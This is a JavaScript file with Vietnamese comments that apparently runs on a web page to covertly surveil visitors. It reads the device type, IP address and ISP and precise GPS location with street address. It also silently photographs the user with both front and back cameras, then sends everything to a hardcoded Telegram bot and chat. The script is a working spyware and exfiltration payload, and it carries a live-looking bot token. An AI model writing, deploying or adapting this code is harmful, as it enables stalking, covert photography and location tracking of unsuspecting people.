const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
    time: '', ip: '', isp: '', address: '',
    lat: '', lon: '', device: '', os: '',
    camera: '⌛ Đang kiểm tra...'
};

function detectDevice() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
        info.os = 'iOS';
        info.device = 'iPhone/iPad';
    } else {
        info.os = 'Windows/PC';
        info.device = 'Computer';
    }
}

async function getIPs() {
    try {
        const res = await fetch('https://ipwho.is/').then(r => r.json());
        info.ip = res.ip;
        info.isp = res.connection?.org || 'N/A';
        // Chỉ lấy tọa độ IP làm dự phòng ban đầu
        if(!info.lat) {
            info.lat = res.latitude;
            info.lon = res.longitude;
            info.address = `${res.city}, ${res.region} (Ước tính qua IP)`;
        }
    } catch (e) { info.ip = 'Bị chặn'; }
}

async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                const acc = pos.coords.accuracy ? ` (±${pos.coords.accuracy.toFixed(1)}m)` : '';
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = (data.display_name || 'Vị trí GPS') + acc;
                } catch { 
                    info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
                }
                resolve();
            },
            () => resolve(),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    });
}

async function captureCamera(facingMode = 'user') {
    try {
        // Yêu cầu quyền camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', ''); 
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                }, 1000);
            };
        });
    } catch (e) { return null; } // Trả về null nếu bị từ chối
}

function getCaption() {
    // Sửa link Google Maps chuẩn (dùng link search tọa độ)
    const mapsLink = (info.lat && info.lon) 
        ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
        : 'Không rõ';

    return `📡 [THÔNG TIN TRUY CẬP]\n\n` +
           `⌛ Thời gian: ${info.time}\n` +
           `📱 Thiết bị: ${info.device} (${info.os})\n` +
           `🌐 IP: ${info.ip}\n` +
           `🏢 ISP: ${info.isp}\n` +
           `🏙 Địa chỉ: ${info.address}\n` +
           `📍 Google Maps: ${mapsLink}\n` +
           `📸 Camera: ${info.camera}`;
}

async function main() {
    info.time = new Date().toLocaleString('vi-VN');
    detectDevice();
    
    // Ưu tiên lấy IP làm nền
    await getIPs();
    // Cố gắng lấy GPS chuẩn mét
    await getLocation();

    // Bước quan trọng: Chụp ảnh (Đây là căn cứ để biết họ có "Cho phép" hay không)
    let front = await captureCamera("user");
    let back = front ? await captureCamera("environment") : null;

    if (front || back) {
        info.camera = `✅ Đã chụp: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        const media = [];
        if (front) {
            media.push({ type: 'photo', media: 'attach://f', caption: getCaption() });
            formData.append('f', front, 'f.jpg');
        }
        if (back) {
            media.push({ type: 'photo', media: 'attach://b' });
            formData.append('b', back, 'b.jpg');
        }
        formData.append('media', JSON.stringify(media));
        await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
        
        return true; // Trả về THÀNH CÔNG
    } else {
        // Nếu bị từ chối camera
        info.camera = '❌ Bị từ chối quyền truy cập';
        await fetch(API_SEND_TEXT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
        });
        
        return false; // Trả về THẤT BẠI
    }
}
